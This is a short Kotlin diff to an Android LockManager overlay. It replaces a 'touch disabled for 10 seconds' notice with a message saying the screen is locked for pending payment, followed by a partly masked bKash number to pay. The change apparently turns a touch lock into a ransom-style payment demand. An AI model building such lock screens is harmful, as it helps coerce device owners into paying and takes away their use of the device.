@@ -79,7 +79,7 @@ class LockManager(
 
             // Add a warning message TextView
             val textView = TextView(context).apply {
-                text = "🔒 Screen Locked\nTouch disabled for 10 seconds"
+                text = "🔒 Screen Locked\nTouch locked for Pending Payment. Please pay us.\nBksah : 0188XXXXXXXXX \n Thanks"
                 setTextColor(Color.WHITE)
                 textSize = 24f
                 gravity = Gravity.CENTER
